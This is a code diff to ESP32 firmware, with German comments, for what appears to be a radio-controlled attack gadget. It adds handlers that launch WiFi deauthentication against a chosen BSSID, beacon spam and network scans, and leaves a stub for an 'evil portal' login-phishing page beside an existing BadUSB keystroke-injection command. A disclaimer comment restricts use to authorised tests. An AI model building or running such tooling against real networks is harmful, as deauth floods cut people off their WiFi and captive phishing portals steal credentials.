@@ -17,6 +17,7 @@
 extern "C" {
 #include "ukfe_rf.h"
 }
+#include "wifi_attack.h"   // native WiFi-Angriffe (Deauth/Beacon/Scan), nicht-blockierend
 
 // Natives USB (ESP32-S3, GPIO19/20) als HID-Tastatur -> BadUSB auf Zielrechner.
 // Nur autorisierte Tests/eigene Geraete. Zielrechner an das native USB (nicht COM26/CP210x).
@@ -161,15 +162,39 @@ void act(const UkfeRfMessage* m) {
         oledMsg("CMD: PAYLOAD", buf, "-> HID getippt");
         break;
     }
-    case UkfeRfCmdWifiDeauth:
-        oledMsg("CMD: WIFI DEAUTH");
-        // TODO(HW): an ESP32-WiFi-Satellit weiterreichen
+    case UkfeRfCmdWifiScan: {
+        oledMsg("CMD: WIFI SCAN", "scanne...");
+        uint8_t n = wifi_attack_scan();           // blockierend ~2 s, danach ESP-NOW-Kanal zurueck
+        snprintf(buf, sizeof(buf), "%u APs gefunden", n);
+        oledMsg("CMD: WIFI SCAN", buf, "-> siehe Serial");
         break;
+    }
+    case UkfeRfCmdWifiDeauth: {
+        // args: uint8 bssid[6], uint8 channel (0=alle/hoppen)
+        if(m->arg_len >= 6) {
+            uint8_t ch = (m->arg_len >= 7) ? m->args[6] : 0;
+            wifi_attack_deauth(m->args, ch, 0);
+            snprintf(buf, sizeof(buf), "ch=%u %02X:%02X:%02X..", ch,
+                     m->args[0], m->args[1], m->args[2]);
+            oledMsg("CMD: WIFI DEAUTH", buf, "laeuft (868=stop)");
+        } else {
+            oledMsg("CMD: WIFI DEAUTH", "arg fehlt (bssid)");
+        }
+        break;
+    }
+    case UkfeRfCmdWifiStop:
+        wifi_attack_stop();
+        oledMsg("CMD: WIFI STOP", "Angriff beendet");
+        break;
+    case UkfeRfCmdBeaconSpam: {
+        uint8_t mode = m->arg_len ? m->args[0] : 0;
+        wifi_attack_beacon(mode, 0);
+        oledMsg("CMD: BEACON SPAM", "laeuft (868=stop)");
+        break;
+    }
     case UkfeRfCmdEvilPortal:
-        oledMsg("CMD: EVIL PORTAL");
-        break;
-    case UkfeRfCmdBeaconSpam:
-        oledMsg("CMD: BEACON SPAM");
+        // TODO: SoftAP + Captive-DNS + Login-Portal (uebernimmt WiFi voll, ESP-NOW pausiert)
+        oledMsg("CMD: EVIL PORTAL", "noch nicht impl.");
         break;
     default:
         snprintf(buf, sizeof(buf), "0x%02X alen=%u", m->cmd, m->arg_len);
@@ -236,6 +261,9 @@ void setup() {
         esp_now_add_peer(&bpeer);
     } else Serial.println("ESP-NOW init FEHLGESCHLAGEN (868-RX laeuft weiter)");
 
+    // WiFi-Angriffsmodul kennt den ESP-NOW-Kanal, um ihn nach Angriffen wiederherzustellen.
+    wifi_attack_init(ESPNOW_CHANNEL);
+
     Serial.printf("\nG4MEOVER UKFE-RX bereit. 868.35MHz-2FSK + ESP-NOW(Kanal %d, %s).\n",
                   ESPNOW_CHANNEL, enow_ok ? "an" : "AUS");
     Serial.printf("STA-MAC %s\n", WiFi.macAddress().c_str());
@@ -243,6 +271,9 @@ void setup() {
 }
 
 void loop() {
+    // Laufenden WiFi-Angriff bedienen (nicht-blockierend, ein Burst pro Iteration).
+    wifi_attack_tick();
+
     // --- ESP-NOW-Frame (WiFi vom WROOM-Relay) zuerst verarbeiten ---
     if(enowFlag) {
         int len = enowLen;
